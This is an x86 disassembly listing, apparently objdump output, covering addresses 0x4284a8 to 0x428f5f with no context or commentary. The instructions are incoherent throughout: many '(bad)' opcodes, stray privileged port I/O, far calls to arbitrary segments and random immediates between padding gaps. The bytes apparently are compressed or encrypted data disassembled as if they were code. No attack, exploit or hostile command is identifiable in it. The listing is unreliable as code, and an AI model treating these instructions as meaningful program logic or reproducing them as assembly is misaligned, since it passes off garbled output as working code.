  4284a8:	jp     0x42844f
  4284aa:	mov    ds:0x2c66ed93,al
  4284af:	loope  0x4284c8
  4284b1:	fidivr DWORD PTR [ecx-0x35]
  4284b4:	aad    0xc3
  4284b6:	imul   edx,DWORD PTR [eax],0xf9f3fdf8
  4284bc:	je     0x42848b
  4284be:	cld    
  4284bf:	mov    bl,0xca
  4284c1:	pop    ds
  4284c2:	sbb    al,0x95
  4284c4:	jmp    ebp
  4284c6:	cdq    
  4284c7:	cmp    BYTE PTR [eax-0x4012ce79],dh
  4284cd:	mov    BYTE PTR [ebp-0x631b222a],al
  4284d3:	add    DWORD PTR [edx+ecx*1+0x71],0x5f4527a1
  4284db:	fadd   st,st(5)
  4284dd:	loopne 0x4284e9
  4284df:	sbb    BYTE PTR [eax+0x2b],0x6f
  4284e3:	add    ebx,DWORD PTR [edi+edx*4+0x5c5af98]
  4284ea:	mov    ebx,0x694c3729
  4284ef:	dec    bh
  4284f1:	out    dx,al
  4284f2:	sbb    edx,DWORD PTR [ecx+0x7c]
  4284f5:	ds mov edi,0x214549fe
  4284fb:	mov    al,ds:0xf25f4eba
  428500:	or     eax,0xcd1a975b
  428505:	add    al,0xae
  428507:	inc    ecx
  428508:	cmp    bl,0x64
  42850b:	std    
  42850c:	inc    esi
  42850d:	js     0x4284ac
  42850f:	sbb    ebx,edi
  428511:	das    
  428512:	xor    BYTE PTR [edx+eax*4+0x3d],bh
  428516:	mov    bl,0x9e
  428518:	or     BYTE PTR [ecx-0x1a],cl
  42851b:	jl     0x42855a
  42851d:	cmp    ebx,esp
  42851f:	test   dl,al
  428521:	retf   0x2c19
  428524:	cwde   
  428525:	cmp    al,0x95
  428527:	fidivr WORD PTR [ebx]
  428529:	fcom   DWORD PTR fs:[ebp-0x30]
  42852d:	iret   
  42852e:	fs stos BYTE PTR es:[edi],al
  428530:	pop    edi
  428531:	rcr    ebx,cl
  428533:	mov    esp,DWORD PTR [edx+0x3be5862e]
  428539:	std    
  42853a:	xor    dl,bh
  42853c:	(bad)  [edx+esi*8-0x63]
  428540:	gs nop
  428542:	jbe    0x4285be
  428544:	push   es
  428545:	push   ebx
  428546:	lods   al,BYTE PTR ds:[esi]
  428547:	inc    edx
  428548:	inc    eax
  428549:	fild   WORD PTR [edi]
  42854b:	fcomp  DWORD PTR [edx+0x44]
  42854e:	add    esp,esi
  428550:	xchg   esi,eax
  428551:	into   
  428552:	adc    eax,edx
  428554:	dec    esp
  428555:	mov    esp,0xeed4c651
  42855a:	push   es
  42855b:	cmp    bh,BYTE PTR [ebx+ecx*1-0x4a14a7e0]
  428562:	stos   DWORD PTR es:[edi],eax
  428563:	sub    eax,0x5f6a5932
  428568:	jo     0x428530
  42856a:	xchg   edx,eax
  42856b:	xor    ebp,0x3615ebe5
  428571:	add    eax,0x6df20af
  428576:	mov    ah,0xd4
  428578:	lea    edi,[edi-0x45cde8eb]
  42857e:	mov    dh,0x60
  428580:	in     eax,0xba
  428582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428583:	shr    DWORD PTR [ecx],0x54
  428586:	mov    ch,0x85
  428588:	mov    bl,0x8c
  42858a:	xchg   DWORD PTR [di-0x4458],edx
  42858f:	push   ebx
  428590:	xor    eax,0x0
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x2fbca3f6
  428602:	push   esp
  428603:	repnz push ds
  428605:	mov    al,0x1
  428607:	add    BYTE PTR ds:0x9b000001,al
  42860d:	or     BYTE PTR [edx+0x40ddef92],ch
  428613:	das    
  428614:	es stos BYTE PTR es:[edi],al
  428616:	push   0x5fc831f2
  42861b:	adc    eax,0xaf14ac67
  428620:	and    eax,0xfcd6f99b
  428625:	test   eax,0xd9be5d8
  42862a:	lock in al,0x8c
  42862d:	or     ebx,DWORD PTR [ecx+0x601ab0f]
  428633:	sub    eax,0xcb851064
  428638:	pop    ebp
  428639:	das    
  42863a:	(bad)  
  42863b:	cli    
  42863c:	xchg   ebp,eax
  42863d:	cwde   
  42863e:	std    
  42863f:	mov    ds:0x2074a254,eax
  428644:	mov    edi,0xb0468430
  428649:	imul   BYTE PTR [ecx-0x58428ece]
  42864f:	pop    es
  428650:	pop    ecx
  428651:	jo     0x428631
  428653:	xor    esp,edi
  428655:	ret    0xee0f
  428658:	cld    
  428659:	in     al,0xe4
  42865b:	outs   dx,DWORD PTR ds:[esi]
  42865c:	call   0x827bd1d4
  428661:	cdq    
  428662:	into   
  428663:	sbb    al,0xf3
  428665:	sbb    cl,bh
  428667:	sbb    eax,0x3e026971
  42866c:	or     DWORD PTR [esi],ebp
  42866e:	lds    edi,FWORD PTR [ecx]
  428670:	push   eax
  428671:	add    al,al
  428673:	pop    eax
  428674:	stos   BYTE PTR es:[edi],al
  428675:	pop    ss
  428676:	push   eax
  428677:	(bad)  
  428678:	icebp  
  428679:	fwait
  42867a:	mov    cl,0x24
  42867c:	retf   
  42867d:	mov    ?,edx
  42867f:	ret    0x91fe
  428682:	xor    DWORD PTR [ecx-0xa817d6f],ebp
  428688:	loope  0x428703
  42868a:	shl    BYTE PTR [eax+0x2acfec35],cl
  428690:	add    cl,BYTE PTR [ebp-0x4d]
  428693:	ret    0x25a5
  428696:	icebp  
  428697:	dec    ecx
  428698:	push   es
  428699:	rol    BYTE PTR [eax-0x65],0xb0
  42869d:	in     al,0xa1
  42869f:	sub    al,0x77
  4286a1:	(bad)  
  4286a3:	popf   
  4286a4:	mov    eax,0xe7091c4
  4286a9:	out    0x42,al
  4286ab:	mov    cl,0xe6
  4286ad:	push   ds
  4286ae:	ds and eax,0x9def7045
  4286b4:	mov    ebp,0x126b0887
  4286b9:	int3   
  4286ba:	imul   esp,DWORD PTR [eax],0xffffffa1
  4286bd:	mov    eax,ds:0x17cbd2a
  4286c2:	xchg   ebx,eax
  4286c3:	cmp    al,0x88
  4286c6:	js     0x4286bf
  4286c8:	xchg   ebp,eax
  4286c9:	repz sub dl,BYTE PTR [ecx]
  4286cc:	fild   WORD PTR [esi+0x300f8adf]
  4286d2:	loop   0x42866a
  4286d4:	pop    es
  4286d5:	lock sub eax,0x5101e96
  4286db:	push   esp
  4286dc:	ss retf 
  4286de:	push   esi
  4286df:	cld    
  4286e0:	imul   edi,DWORD PTR [ebp-0x1397964a],0x8c391965
  4286ea:	fadd   QWORD PTR [edi-0x78]
  4286ed:	xchg   ebp,eax
  4286ee:	push   0x6a
  4286f0:	daa    
  4286f1:	adc    BYTE PTR [ecx+0x29],cl
  4286f4:	mov    ch,0x7e
  4286f6:	gs shr ebp,0x89
  4286fa:	sbb    BYTE PTR [edx-0x72b501c5],dl
  428700:	mov    ebp,0x20e44705
  428705:	mov    ds:0x3e3e384,eax
  42870a:	(bad)  
  42870b:	pop    esi
  42870c:	popa   
  42870d:	xor    al,0xed
  42870f:	lods   eax,DWORD PTR ds:[esi]
  428710:	pop    ds
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xee93e096
  428783:	sub    DWORD PTR [ebx],esp
  428785:	mov    cl,0x1
  428787:	add    BYTE PTR ds:0x4000001,al
  42878d:	mov    dh,0x9a
  42878f:	sti    
  428790:	sbb    DWORD PTR [ebx],eax
  428792:	jmp    0x428764
  428794:	mov    ch,0xfa
  428796:	dec    ebx
  428797:	sbb    esi,DWORD PTR [ecx+0x63]
  42879a:	or     DWORD PTR [eax+0x25838ddf],edi
  4287a0:	mov    WORD PTR [eax-0x14],ds
  4287a3:	lahf   
  4287a4:	inc    ebp
  4287a5:	add    DWORD PTR [edx+esi*8+0x25],eax
  4287a9:	mov    esi,0x1869a378
  4287ae:	pop    ebp
  4287af:	and    DWORD PTR [edx+0x25],esp
  4287b2:	pop    ecx
  4287b3:	rol    DWORD PTR [ecx+0x463f1f7c],cl
  4287b9:	cmp    dh,BYTE PTR [ebx+0x56]
  4287bc:	jmp    0x4287d1
  4287be:	mov    ecx,0x1c57c93b
  4287c3:	lea    edi,[esi+ebx*4-0x6e]
  4287c7:	test   DWORD PTR [edi],0x7f5c0923
  4287cd:	jp     0x4287af
  4287cf:	aad    0x54
  4287d1:	cdq    
  4287d2:	mov    WORD PTR [ecx],?
  4287d4:	mul    BYTE PTR [edi+ebp*1-0x440957fa]
  4287db:	ins    BYTE PTR es:[edi],dx
  4287dc:	add    eax,0x92acfad8
  4287e1:	inc    ebx
  4287e2:	stc    
  4287e3:	(bad)  
  4287e4:	call   DWORD PTR [ebx+0x50]
  4287e7:	les    ebp,FWORD PTR [ebp-0x2e]
  4287ea:	push   ecx
  4287eb:	xchg   esi,eax
  4287ec:	addr16 retf 0x7e2f
  4287f0:	and    edi,DWORD PTR [eax-0x4e4bcfc8]
  4287f6:	mov    ss:0xb2538532,al
  4287fc:	mov    dl,0xe1
  4287fe:	sub    al,0x2c
  428800:	mov    esp,0xcefbd48
  428805:	push   0x7c
  428807:	xchg   edi,eax
  428808:	outs   dx,DWORD PTR ds:[esi]
  428809:	xchg   edi,eax
  42880a:	add    dh,BYTE PTR [edx+0x68]
  42880d:	push   ss
  42880e:	nop
  42880f:	xor    eax,0xe8ede54d
  428814:	mov    ebx,DWORD PTR [edi]
  428816:	in     eax,dx
  428817:	fld    TBYTE PTR [eax-0x4b]
  42881a:	xor    eax,0x26017b81
  42881f:	mov    ah,0x7f
  428821:	popa   
  428822:	test   ebx,0x9b34d7d0
  428828:	addr16 mov ecx,0x22faf2ac
  42882e:	lods   al,BYTE PTR ds:[esi]
  42882f:	inc    esp
  428830:	call   0x700c:0xf83f303d
  428837:	mov    al,0xbb
  428839:	test   eax,0x651b9ca2
  42883e:	ret    
  42883f:	test   eax,0x93abf593
  428844:	xchg   ebx,edx
  428846:	sub    ebx,DWORD PTR [ecx+0x25]
  428849:	in     al,0x40
  42884b:	(bad)  
  42884d:	(bad)  
  42884e:	fcomp  DWORD PTR [eax-0x7d5fe6b0]
  428854:	mov    ebx,DWORD PTR [eax]
  428856:	add    BYTE PTR es:[esp+ecx*1-0x52577fcd],dl
  42885e:	push   cs
  42885f:	xchg   ecx,eax
  428860:	and    ebp,ebx
  428862:	daa    
  428863:	sub    eax,0x435bfa1b
  428868:	jle    0x4288db
  42886a:	retf   0xa755
  42886d:	sbb    edi,edx
  42886f:	mov    WORD PTR [esi],fs
  428871:	scas   eax,DWORD PTR es:[edi]
  428872:	loopne 0x428835
  428874:	cmp    eax,0x88550797
  428879:	xor    BYTE PTR [esi],cl
  42887b:	sbb    bh,BYTE PTR [ebp+0x16]
  42887e:	add    dl,cl
  428880:	or     BYTE PTR [ecx+0x38720714],ah
  428886:	cld    
  428887:	add    DWORD PTR ds:0x3ed70f54,ecx
  42888d:	ror    BYTE PTR [eax],0xea
  428890:	out    dx,al
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x77fe62f1],bx
  428902:	js     0x4288ec
  428904:	sub    BYTE PTR [edx+0x1050001],dh
  42890a:	add    BYTE PTR [eax],al
  42890c:	and    esp,0x7d36fef8
  428912:	sbb    bl,ch
  428914:	inc    eax
  428915:	cdq    
  428916:	adc    eax,0x60d0e798
  42891b:	aaa    
  42891c:	and    al,0x69
  42891e:	imul   BYTE PTR [esi+ebx*1+0x680f7bb2]
  428925:	sbb    edx,DWORD PTR [edi+0x38]
  428928:	ja     0x42895f
  42892a:	or     bl,BYTE PTR [ecx-0x3]
  42892d:	mov    gs:0xc4283dab,al
  428933:	cwde   
  428934:	mov    al,ds:0x10726cd2
  428939:	icebp  
  42893a:	xchg   esp,eax
  42893b:	mov    bl,0x7a
  42893d:	xchg   ebx,eax
  42893e:	fnsave [esi+ecx*4-0x12]
  428942:	or     al,0x7f
  428944:	lods   al,BYTE PTR ds:[esi]
  428945:	cs ret 0xea4c
  428949:	das    
  42894a:	call   0xdfb5:0x86f8266e
  428951:	xor    BYTE PTR [eax],0x9f
  428954:	inc    esp
  428955:	or     al,BYTE PTR [edx-0x2a]
  428958:	sti    
  428959:	int    0xc0
  42895b:	in     eax,dx
  42895c:	jb     0x42898f
  42895e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42895f:	jl     0x42891b
  428961:	fadd   QWORD PTR [esi-0x74]
  428964:	pushf  
  428965:	dec    edi
  428966:	dec    edx
  428967:	push   es
  428968:	lds    esp,FWORD PTR [edi]
  42896a:	(bad)  
  42896b:	and    al,0x32
  42896d:	adc    eax,0xde4b899
  428972:	repnz mov DWORD PTR [esi-0x77f2cfb6],ecx
  428979:	mov    eax,0x9451e9e3
  42897e:	adc    DWORD PTR [edx-0x49ae8274],edi
  428984:	mov    ebp,cs
  428986:	dec    esi
  428987:	mov    dl,0xe6
  428989:	clc    
  42898a:	dec    si
  42898c:	dec    esp
  42898d:	in     eax,dx
  42898e:	jle    0x4289d3
  428990:	std    
  428991:	popf   
  428992:	arpl   WORD PTR ds:0x5d780a18,sp
  428998:	jp     0x4289b9
  42899a:	bound  ecx,QWORD PTR [ecx]
  42899c:	js     0x42892b
  42899e:	sbb    eax,DWORD PTR [ebx+0x10a5f724]
  4289a4:	cwde   
  4289a5:	add    eax,0xd6c2f394
  4289aa:	mov    cl,0x9c
  4289ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289ad:	mov    edi,0xaf64673f
  4289b2:	mov    esp,0xb02a898c
  4289b7:	and    eax,0x8806e14
  4289bc:	pop    ss
  4289bd:	pop    ebx
  4289be:	jge    0x4289cc
  4289c0:	mov    al,ds:0x23a88f6c
  4289c5:	jb     0x4289b5
  4289c7:	and    al,0xdd
  4289c9:	cmp    ah,dh
  4289cb:	imul   esp,DWORD PTR [ecx-0x72536661],0xa7e4bb0f
  4289d5:	cmp    ax,0xd802
  4289d9:	(bad)  
  4289da:	sar    BYTE PTR [esi+0x38],cl
  4289dd:	dec    edx
  4289de:	sub    BYTE PTR [ecx],dl
  4289e0:	rcl    ebx,0x55
  4289e3:	dec    edi
  4289e4:	(bad)
  4289e7:	loop   0x428a34
  4289e9:	loopne 0x4289b2
  4289eb:	mov    ebx,0x8ed7c6de
  4289f0:	mov    eax,0x97e49223
  4289f5:	jbe    0x4289b5
  4289f7:	test   al,0x54
  4289f9:	xchg   esp,eax
  4289fa:	dec    ebp
  4289fb:	fistp  QWORD PTR [esi+0x60]
  4289fe:	call   DWORD PTR [esi-0xc]
  428a01:	cmp    dh,dl
  428a03:	dec    ebp
  428a04:	sbb    eax,0xcc15dc74
  428a09:	shr    DWORD PTR [esp+eax*4],cl
  428a0c:	pop    es
  428a0d:	icebp  
  428a0e:	inc    ebp
  428a0f:	popa   
  428a10:	loopne 0x428a12
	...
  428a72:	add    BYTE PTR [eax],al
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x78e76513]
  428a83:	cmp    BYTE PTR ds:0x50001b3,ch
  428a89:	add    DWORD PTR [eax],eax
  428a8b:	add    dh,ch
  428a8d:	js     0x428afe
  428a8f:	and    eax,0x8247a4e7
  428a94:	idiv   BYTE PTR [eax-0x198ad572]
  428a9a:	mov    es,WORD PTR [ecx-0x6e45e08c]
  428aa0:	and    DWORD PTR [edx-0x1933b52b],0xffffffaa
  428aa7:	call   0xe5e6:0x729093cc
  428aae:	cs push ecx
  428ab0:	les    ebx,FWORD PTR [edi]
  428ab2:	push   edi
  428ab3:	xchg   DWORD PTR [edi],eax
  428ab5:	dec    edx
  428ab6:	xchg   esi,eax
  428ab7:	xchg   edi,eax
  428ab8:	leave  
  428ab9:	fidiv  WORD PTR [bx-0x361a]
  428abe:	cwde   
  428abf:	mov    ebp,DWORD PTR [ebx-0x3e]
  428ac2:	fdiv   st,st(5)
  428ac4:	cmc    
  428ac5:	in     eax,0xf0
  428ac7:	mov    ch,0x75
  428ac9:	pushf  
  428aca:	dec    eax
  428acb:	inc    esp
  428acc:	jns    0x428aa9
  428ace:	lods   eax,DWORD PTR ds:[esi]
  428acf:	packuswb mm4,QWORD PTR [edx]
  428ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ad3:	mov    ecx,0x1fccc1aa
  428ad8:	and    edi,esi
  428ada:	xor    eax,0x154428d0
  428adf:	sub    ecx,DWORD PTR ds:0x12749ea5
  428ae5:	jecxz  0x428b4c
  428ae7:	lods   al,BYTE PTR ds:[esi]
  428ae8:	(bad)  
  428ae9:	push   eax
  428aea:	or     ecx,esi
  428aec:	xchg   esi,eax
  428aed:	cs aad 0x1
  428af0:	cmp    BYTE PTR [ecx+0x7c988bec],ah
  428af6:	or     BYTE PTR [ebp+edi*2-0x39a0252d],bh
  428afd:	inc    esi
  428afe:	js     0x428ab5
  428b00:	rcl    BYTE PTR [esi],0xc9
  428b03:	jmp    0xb687:0xb813685b
  428b0a:	into   
  428b0b:	popf   
  428b0c:	sub    bh,al
  428b0e:	ret    
  428b0f:	mov    BYTE PTR [edx],ch
  428b11:	push   edi
  428b12:	mov    WORD PTR [edi+esi*4+0x2cc598d7],es
  428b19:	call   0x72af:0xfbf15f5f
  428b20:	cld    
  428b21:	out    0xfe,eax
  428b23:	fstp   st(2)
  428b25:	jbe    0x428ba4
  428b27:	rcr    ebp,0xc2
  428b2a:	nop
  428b2b:	sub    eax,0xf2fc1c8d
  428b30:	jnp    0x428baa
  428b32:	xchg   edi,eax
  428b33:	pusha  
  428b34:	jg     0x428b6a
  428b36:	mov    ds:0x7caf0cf2,al
  428b3b:	xor    DWORD PTR [eax+0x14],edx
  428b3e:	ins    BYTE PTR es:[edi],dx
  428b3f:	adc    DWORD PTR [edx+esi*2+0x3],eax
  428b43:	or     ebx,eax
  428b45:	outs   dx,BYTE PTR ds:[esi]
  428b46:	repz sub BYTE PTR [edx],dl
  428b49:	mov    BYTE PTR [ebx-0x348f981d],ch
  428b4f:	push   es
  428b50:	(bad)  
  428b52:	leave  
  428b53:	jo     0x428b25
  428b55:	jl     0x428b05
  428b57:	stos   DWORD PTR es:[edi],eax
  428b58:	dec    ebx
  428b59:	xlat   BYTE PTR ds:[ebx]
  428b5a:	inc    ecx
  428b5b:	in     eax,0x6
  428b5d:	loopne 0x428b69
  428b5f:	add    DWORD PTR [edi-0x70],esp
  428b62:	adc    BYTE PTR [ebp-0xc],dh
  428b65:	mov    eax,0x9110629
  428b6a:	jmp    0xff43:0x3751600b
  428b71:	and    DWORD PTR [edx-0x4a4b05dc],edi
  428b77:	pop    edx
  428b78:	mov    ebp,0x2cd4b178
  428b7d:	in     al,dx
  428b7e:	aam    0x9c
  428b80:	into   
  428b81:	bound  eax,QWORD PTR [edi+0x49]
  428b84:	cwde   
  428b85:	dec    edi
  428b86:	je     0x428b12
  428b88:	add    eax,0xff84965e
  428b8d:	or     BYTE PTR [esi-0x2a],ch
  428b90:	test   BYTE PTR [eax],al
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xc95c5e8f
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebp-0x62],cl
  428c0e:	mov    eax,ds:0xe919438
  428c13:	dec    ebx
  428c14:	es push ecx
  428c16:	dec    ecx
  428c17:	out    0xb4,eax
  428c19:	rcl    DWORD PTR [esi-0x1210236c],cl
  428c1f:	dec    ebp
  428c20:	add    eax,0xcf388a40
  428c25:	lods   al,BYTE PTR ds:[esi]
  428c26:	push   ds
  428c27:	into   
  428c28:	sbb    al,0xf4
  428c2a:	cmp    ebx,DWORD PTR [ecx+ebp*4]
  428c2d:	retf   0x7582
  428c30:	push   ss
  428c31:	xchg   esi,eax
  428c32:	mov    ch,0x82
  428c34:	dec    esp
  428c35:	mov    eax,0xc9cda2d3
  428c3a:	mov    cl,BYTE PTR [ecx]
  428c3c:	cmp    eax,0xf91a79e3
  428c41:	jge    0x428bd9
  428c43:	push   0xffffffe3
  428c45:	sub    ebp,DWORD PTR [eax-0x60676aac]
  428c4b:	pop    ebx
  428c4c:	fild   QWORD PTR [eax+0x39]
  428c4f:	push   esi
  428c50:	push   esi
  428c51:	sbb    esp,DWORD PTR [eax]
  428c53:	mov    al,0xd
  428c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c56:	pop    es
  428c57:	mov    cl,0x45
  428c59:	sub    eax,edi
  428c5b:	pop    ebx
  428c5c:	inc    BYTE PTR [edi+0x2236b29]
  428c62:	nop
  428c63:	retf   0x5fa4
  428c66:	add    al,0xcd
  428c68:	mov    al,ds:0x4e012335
  428c6d:	inc    esp
  428c6e:	pop    ss
  428c6f:	ss mov bh,0xd1
  428c72:	daa    
  428c73:	pop    edx
  428c74:	dec    edx
  428c75:	cmp    ebx,edx
  428c77:	fwait
  428c78:	dec    esp
  428c79:	stos   BYTE PTR es:[edi],al
  428c7a:	jp     0x428c2a
  428c7c:	jmp    0x36786de3
  428c81:	mov    ch,0x45
  428c83:	sbb    ebx,edx
  428c85:	xchg   edi,eax
  428c86:	loope  0x428cee
  428c88:	mov    DWORD PTR [ecx-0x22],edi
  428c8b:	cwde   
  428c8c:	lods   al,BYTE PTR ds:[esi]
  428c8d:	jge    0x428c29
  428c8f:	mov    edi,0xc52d2ad3
  428c94:	dec    ebp
  428c95:	adc    al,0x2d
  428c97:	add    al,0xaa
  428c99:	jae    0x428c7b
  428c9b:	iret   
  428c9c:	aad    0xd3
  428c9e:	fidivr DWORD PTR [edx+eiz*1]
  428ca1:	and    BYTE PTR [ebp+0x31],0xb2
  428ca5:	push   ds
  428ca6:	xor    dh,BYTE PTR [ecx]
  428ca8:	popf   
  428ca9:	jbe    0x428cf4
  428cab:	pop    ds
  428cac:	int3   
  428cad:	loop   0x428cc5
  428caf:	sahf   
  428cb0:	(bad)  
  428cb1:	gs nop
  428cb3:	cs addr16 jne 0x428ce4
  428cb7:	dec    ebx
  428cb8:	xor    BYTE PTR [ecx-0x1d],al
  428cbb:	lods   eax,DWORD PTR ds:[esi]
  428cbc:	sbb    eax,0x4162ebbd
  428cc1:	je     0x428ca5
  428cc3:	cmp    al,0x65
  428cc5:	push   edx
  428cc6:	xchg   ecx,eax
  428cc7:	aad    0x8f
  428cc9:	add    ah,BYTE PTR [edi+0x5b5862c9]
  428ccf:	dec    edx
  428cd0:	push   eax
  428cd1:	or     eax,0x4ea88a1c
  428cd6:	(bad)  
  428cd7:	(bad)  
  428cd8:	mov    ds:0xd171c51f,al
  428cdd:	pop    ecx
  428cde:	ins    BYTE PTR es:[edi],dx
  428cdf:	lods   eax,DWORD PTR ds:[esi]
  428ce0:	push   ss
  428ce1:	dec    edi
  428ce2:	inc    ecx
  428ce4:	sbb    bh,bh
  428ce6:	dec    ecx
  428ce7:	push   es
  428ce8:	pop    ds
  428ce9:	shl    DWORD PTR [esi],1
  428ceb:	mov    edi,0x6123907e
  428cf0:	mov    edi,0x9baaf5ae
  428cf5:	fcmovb st,st(7)
  428cf7:	pop    edi
  428cf8:	dec    ebx
  428cf9:	mov    ebp,0xce389920
  428cfe:	mov    cl,0x91
  428d00:	pop    ebx
  428d01:	scas   eax,DWORD PTR es:[edi]
  428d02:	mov    bh,BYTE PTR [edi]
  428d04:	mov    ebx,0xf99f7129
  428d09:	mov    eax,ds:0x8b80331f
  428d0e:	fsub   QWORD PTR [esp+edi*4+0x0]
	...
  428d72:	add    BYTE PTR [eax],al
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xd480
  428d82:	iret   
  428d83:	adc    DWORD PTR [edi],esi
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x61000001,al
  428d8d:	push   0x47
  428d8f:	push   eax
  428d90:	cld    
  428d91:	rcl    DWORD PTR [esi],cl
  428d93:	dec    edx
  428d94:	das    
  428d95:	xor    ch,bh
  428d97:	aas    
  428d98:	xchg   ebp,eax
  428d99:	cmp    DWORD PTR [ebp-0x50657f2b],edi
  428d9f:	call   0xb037:0xd182394e
  428da6:	cdq    
  428da7:	adc    esp,eax
  428da9:	dec    edi
  428daa:	xchg   ecx,eax
  428dab:	dec    esi
  428dac:	mov    edi,0x6269f122
  428db1:	and    DWORD PTR [esi+0x1c],edx
  428db4:	int    0xdd
  428db6:	jp     0x428e26
  428db8:	adc    bl,BYTE PTR [ecx+ebp*2]
  428dbb:	jge    0x428d6d
  428dbd:	sbb    edi,DWORD PTR [edx]
  428dbf:	sbb    bh,BYTE PTR [ebx]
  428dc1:	push   es
  428dc2:	push   eax
  428dc3:	and    DWORD PTR [ebp-0x7d7cb074],esp
  428dc9:	mov    bh,0x95
  428dcb:	retf   
  428dcc:	fstp   DWORD PTR [edx+edx*1]
  428dcf:	rep es ins DWORD PTR es:[edi],dx
  428dd2:	mov    ch,bh
  428dd4:	cld    
  428dd5:	jb     0x428e04
  428dd7:	xchg   ebp,eax
  428dd8:	sbb    DWORD PTR [edx-0x7f],0xffffffeb
  428ddc:	mov    ds:0xb1d33d7f,al
  428de1:	xchg   DWORD PTR [edi+0x17],ebp
  428de4:	jmp    0x428dfc
  428de6:	(bad)  
  428de7:	mov    bl,0xcd
  428de9:	pop    esp
  428dea:	ss jo  0x428d74
  428ded:	push   esp
  428dee:	inc    ebx
  428def:	mov    ebx,0x4d2909ac
  428df4:	pop    edi
  428df5:	add    eax,0x4d950453
  428dfa:	push   edi
  428dfb:	adc    DWORD PTR [esi-0x60a1869d],esi
  428e01:	repnz mov ebp,0xa7d6211a
  428e07:	push   esp
  428e08:	lahf   
  428e09:	aad    0x51
  428e0b:	sbb    DWORD PTR [ecx-0x1ace352d],edx
  428e11:	cld    
  428e12:	mov    ebx,ebx
  428e14:	inc    esi
  428e15:	inc    esp
  428e16:	in     al,dx
  428e17:	pop    ss
  428e18:	cmp    DWORD PTR [ecx+edi*4-0x3d70e9b5],eax
  428e1f:	into   
  428e20:	cmp    DWORD PTR [esi-0x213b82d3],esp
  428e26:	sbb    eax,0x7334d94f
  428e2b:	push   ebp
  428e2c:	push   ds
  428e2d:	push   edx
  428e2e:	dec    eax
  428e2f:	retf   0xe1c8
  428e32:	push   ss
  428e33:	xchg   BYTE PTR [eax],bh
  428e35:	gs inc eax
  428e37:	fidivr WORD PTR es:[edi+0x664a4d0f]
  428e3e:	loope  0x428e5b
  428e40:	outs   dx,DWORD PTR ds:[esi]
  428e41:	and    DWORD PTR gs:[ecx+0x63ed8238],eax
  428e48:	jp     0x428de8
  428e4a:	fistp  DWORD PTR [eax]
  428e4c:	push   0xffffffd1
  428e4e:	pop    ebx
  428e4f:	and    al,0xf4
  428e51:	jge    0x428e92
  428e53:	mov    ds:0x3612c85c,eax
  428e58:	adc    BYTE PTR [edi],0x8b
  428e5b:	mov    al,ds:0x6b2154a
  428e60:	adc    al,0x36
  428e62:	iret   
  428e63:	add    eax,0x9bfbac7e
  428e68:	xchg   esi,eax
  428e69:	pop    ds
  428e6a:	jle    0x428edc
  428e6c:	cmp    DWORD PTR [esi+0x2aaef911],ecx
  428e72:	test   BYTE PTR ds:0xbd9b7703,0x74
  428e79:	iret   
  428e7a:	push   edi
  428e7b:	ret    0x8ae3
  428e7e:	sbb    DWORD PTR [ebp+0x2de636b0],ebx
  428e84:	sbb    al,bl
  428e86:	in     eax,dx
  428e87:	adc    cl,BYTE PTR [edx]
  428e89:	mov    fs,WORD PTR [ebx*2+0x188885dd]
  428e90:	stos   BYTE PTR es:[edi],al
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xe2
  428f01:	mov    dl,BYTE PTR [edx+0x1b63c8e]
  428f07:	add    BYTE PTR ds:0x28000001,al
  428f0d:	(bad)  ds:0x70f5eec3
  428f13:	mov    edx,0x547755b0
  428f18:	jne    0x428efa
  428f1a:	inc    esp
  428f1b:	jl     0x428ee6
  428f1d:	push   cs
  428f1e:	inc    ecx
  428f1f:	inc    ebp
  428f20:	sub    BYTE PTR [edi-0x7c8f78ef],dh
  428f26:	mov    ah,0xec
  428f28:	and    BYTE PTR [edi+0x17],bh
  428f2b:	pop    edi
  428f2c:	cwde   
  428f2d:	out    dx,al
  428f2e:	sub    DWORD PTR [ebp+0x41d9028e],edx
  428f34:	pop    eax
  428f35:	xchg   edx,eax
  428f36:	outs   dx,DWORD PTR ds:[esi]
  428f37:	add    eax,0x69a05379
  428f3c:	push   ebp
  428f3d:	mov    dh,0xb0
  428f3f:	jne    0x428f28
  428f41:	mul    BYTE PTR [edi+ecx*4]
  428f44:	add    cl,cl
  428f46:	mov    dl,0x4d
  428f48:	push   eax
  428f49:	imul   esp,DWORD PTR [ecx],0x16
  428f4c:	sub    eax,0x6d9314d5
  428f51:	inc    ebx
  428f52:	cs aas 
  428f54:	in     al,0xe4
  428f56:	jg     0x428efd
  428f58:	xchg   ebp,eax
  428f59:	ja     0x428fae
  428f5b:	jmp    0x428fb6
  428f5d:	loope  0x428f14
  428f5f:	dec    edx
